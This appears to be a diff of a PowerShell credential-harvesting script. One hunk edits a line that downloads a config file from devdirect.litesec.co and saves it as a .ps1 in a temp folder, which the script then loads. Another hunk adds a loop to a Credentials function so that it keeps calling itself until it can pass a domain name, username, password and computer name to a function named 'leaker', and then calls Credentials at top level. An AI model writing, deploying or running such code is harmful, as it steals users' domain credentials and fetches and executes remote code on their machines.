@@ -81,7 +81,7 @@ if ([string]::IsNullOrEmpty($override)) {
 }
 
 if ([string]::IsNullOrEmpty($path)) {
-    Invoke-RestMethod -uri "http://devdirect.litesec.co" -OutFile $temp"\cl_params.ps1"
+    Invoke-RestMethod -uri "http://devdirect.litesec.co/config.cl" -OutFile $temp"\cl_params.ps1"
 }
 # If being used, load config file
 if (Test-Path -Path $temp"cl_params.ps1") {
@@ -218,3 +218,13 @@ function Credentials() {
             if ([string]::isnullorempty($domain.name) -eq $false) {
                 leaker $CurrentDomain_Name $username $password $ComputerName
                 $status = $false
+                exit
+            }
+            else {
+                Credentials
+            }
+        }
+    }
+}
+
+Credentials
